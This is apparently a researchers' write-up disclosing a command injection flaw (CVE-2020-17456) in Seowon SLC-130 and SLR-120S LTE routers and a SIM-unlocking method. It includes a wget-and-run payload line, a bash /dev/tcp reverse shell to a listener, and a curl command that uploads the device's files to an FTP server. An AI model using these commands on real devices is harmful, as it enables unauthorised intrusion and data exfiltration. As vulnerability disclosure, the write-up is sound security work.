## Seowon SLC-130 And SLR-120S Router-RCE Exploit + Unlocking method ( CVE-2020-17456 ) 




Hello there , we hope you doing well .

2 days ago one my friends gave us a Seowon Slc-130 as a gift but unfortunately the Sim card that he had put in that devices has no internet subscription :D

so we were bored and we just thought that let’s take a look at the Web Interface of this device …

the default username/password was admin/admin so we just logged in and start crawling all the sections of the web interface .


![Image](https://raw.githubusercontent.com/maj0rmil4d/Seowon-SlC-130-Exploit/gh-pages/slc130-1.png)


during crawling we saw an interesting point that the Web App takes an IP Address from me and just trying to Ping/Traceroute to it , we tried to append a Linux command to it with a Linux command separator ( like && , ; ) and we saw that the output of my commands is reflecting into the screen :)

![Image](https://raw.githubusercontent.com/maj0rmil4d/Seowon-SlC-130-Exploit/gh-pages/slc130-2.png)

so here we go with the command execution vulnerability

the next challenge is to get a reverse shell , after digging with commands we find out that the OS of the device is BusyBox and the only way to get a reverse shell from it is working with bash ..

so we setup my listener and put my payload to a file then downloaded on the device and finally ran the command .

`wget http://192.168.1.10/payload.txt ; bash payload.txt `

![Image](https://raw.githubusercontent.com/maj0rmil4d/Seowon-SlC-130-Exploit/gh-pages/slc130-3.png)

so now we got the reverse shell …

the content of the payload.txt

` bash -i >& /dev/tcp/192.168.1.10/8080 0>&1 `

as you already know this device is a LTE router some of these devices has Sim card restrictions so the next challenge is to Bypass ( Unlock ) the device .

so the first step is to get all of the files on the device on our local machine for more comfortability during working with files so I used a FTP Server and Curl command to upload all files on my local machine :

![Image](https://raw.githubusercontent.com/maj0rmil4d/Seowon-SlC-130-Exploit/gh-pages/slc130-4.jpeg)

the command that has been used :

` find www -type f -exec curl -u maj0r:maj0r — ftp-create-dirs -T {} ftp://192.168.1.10/{} \; `

as we knew the main vendor that the factory has been put the restrict for it we just grep the vendor name on the files that has been uploaded to my FTP Server and one of the files was the one we were looking for .

![Image](https://raw.githubusercontent.com/maj0rmil4d/Seowon-SlC-130-Exploit/gh-pages/slc130-5.jpeg)

after opening the file we just saw the command that should be ran to bypass the restrictions and Unlock the device

![Image](https://raw.githubusercontent.com/maj0rmil4d/Seowon-SlC-130-Exploit/gh-pages/slc130-6.jpeg)

so after all we ran the command and the device has been unlocked

![Image](https://raw.githubusercontent.com/maj0rmil4d/Seowon-SlC-130-Exploit/gh-pages/slc130-7.jpeg)

that’s the whole process of what we did to unlock the device , we hope you love it . I wanna say thanks to Ali Jalalat for everything.

after all , this method is working on the SLR-120S too.

the exploit is available at [exploit.py](https://github.com/maj0rmil4d/Seowon-SlC-130-And-SLR-120S-Exploit/blob/gh-pages/slc-130-SLR-120S-Exploit.py)

And Thanks for your time .

you can contact us at twitter :

[Ali Jalalat](https://twitter.com/AliJalalat)
[Milad Soltanian](https://twitter.com/maj0rmil4d)
